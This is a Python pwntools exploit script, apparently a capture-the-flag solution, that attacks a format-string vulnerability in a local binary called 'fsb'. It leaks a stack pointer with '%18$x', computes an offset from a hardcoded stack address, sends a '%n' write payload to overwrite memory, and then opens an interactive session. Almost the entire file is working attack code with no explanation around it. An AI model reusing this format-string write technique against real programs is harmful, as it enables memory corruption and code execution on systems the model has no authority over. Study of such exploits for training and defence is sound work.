import struct
from elftools.construct import LFloat32, UBInt32
from pwn import *

target = process("./fsb")

# Send the format string to leak the EBP value
print(target.recvline())
target.sendline("%18$x")

EBP_hex = target.recvline().strip()  # Read and strip newline character
EBP_hex = b"0x"+EBP_hex
print(b"EBP : " + EBP_hex)
# Convert the received value to an integer
EBP = int(EBP_hex.decode(),base=16)
print("decimal value of EBP :" , EBP)

# Calculate the offset (in hexadecimal format)
offset = int((72/4) + (0xffffd6d8 - EBP)/4)

print(f"Offset detected:", offset)

# Create the attack string
# Note: The offset needs to be the position in the stack where the value should be written,
# this is usually determined by the target application and exploit context.
attack_string = f"%65x%{offset}$n"

# Send the attack string
print(target.recvline())
target.sendline(attack_string)

print(target.recvlines(2))
target.sendline(b" ")

print(target.recvline())
target.sendline(b" ")
time.sleep(3.3)
# target.sendline(b"A")
target.interactive()
